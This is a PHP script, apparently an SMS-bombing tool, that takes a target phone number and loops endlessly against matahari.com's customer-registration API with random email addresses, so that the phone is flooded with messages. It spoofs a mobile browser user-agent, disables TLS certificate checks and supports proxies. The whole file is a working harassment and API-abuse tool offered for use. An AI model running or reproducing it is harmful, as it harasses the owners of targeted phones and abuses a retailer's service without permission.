<?php


class Matahari{
  public $url="https://www.matahari.com/rest/V1/thorCustomers";
  public function __construct(){
    $this->head=[
      "user-agent"=>"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
      "content-type"=>"application/json",
      "referer"=>"https://www.matahari.com/customer/account/create/"
      ];
    
  }
 private function head(){
   foreach($this->head as $head=>$body){
     $mh[]=$head.": ".$body;
   }
   return $mh;
 }
 private function curl ($url, $post = 0, $httpheader = 0, $proxy = 0){ // url, postdata, http headers, proxy, uagent
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        if($post){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if($httpheader){
            curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
        }
        if($proxy){
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            //curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        }
        curl_setopt($ch, CURLOPT_HEADER, true);
        $response = curl_exec($ch);
        $httpcode = curl_getinfo($ch);
        if(!$httpcode) return "Curl Error : ".curl_error($ch); else{
            $header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
            $body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
            curl_close($ch);
            return array($header, $body);
        }
    }
    
  public function url($no){
    $url=$this->url;
    $data=json_encode([
      "thor_customer"=>["name"=>" Bangsaaat","card_number"=>null,"email_address"=>substr(md5(time()),0,8)."@gmail.com","mobile_country_code"=>"+62","gender_id"=>"4","mobile_number"=>$no,"mro"=>"","password"=>"abunawas234","birth_date"=>"31/05/1990"]]);
    return $this->curl($url,$data,$this->head());
  }  
  
  public function gass(){
    system("clear");
    echo $this->banner();
    $no=readline("[>]Input No: ");
    $i=1;
    while(1){
    $data=$this->url($no);
    $data=json_decode($data[1],1);
    if($data['outcome_message'] == "Success"){
      echo "\e[1;31m>> \e[1;33m".$i++." \e[1;35m".$data['outcome_message']." \e[1;31msend to \e[1;35m".substr_replace($no,"\e[1;36m######\e[1;35m",4,-3)."\n";
    }
   }
  }
  public function banner(){
    $bann="
╔══╦═╦═╦═╗╔══╦═╦═╦══╗
║╔╗║║║║║║║║══╣║║║║══╣
║╔╗║║║║║║║╠══║║║║╠══║
╚══╩═╩╩═╩╝╚══╩╩═╩╩══╝
    \n";
    echo "\e[1;35mcreated kakatoji\e[0m\n";
echo $bann;
 }

}
$new=new matahari();
$new->gass();
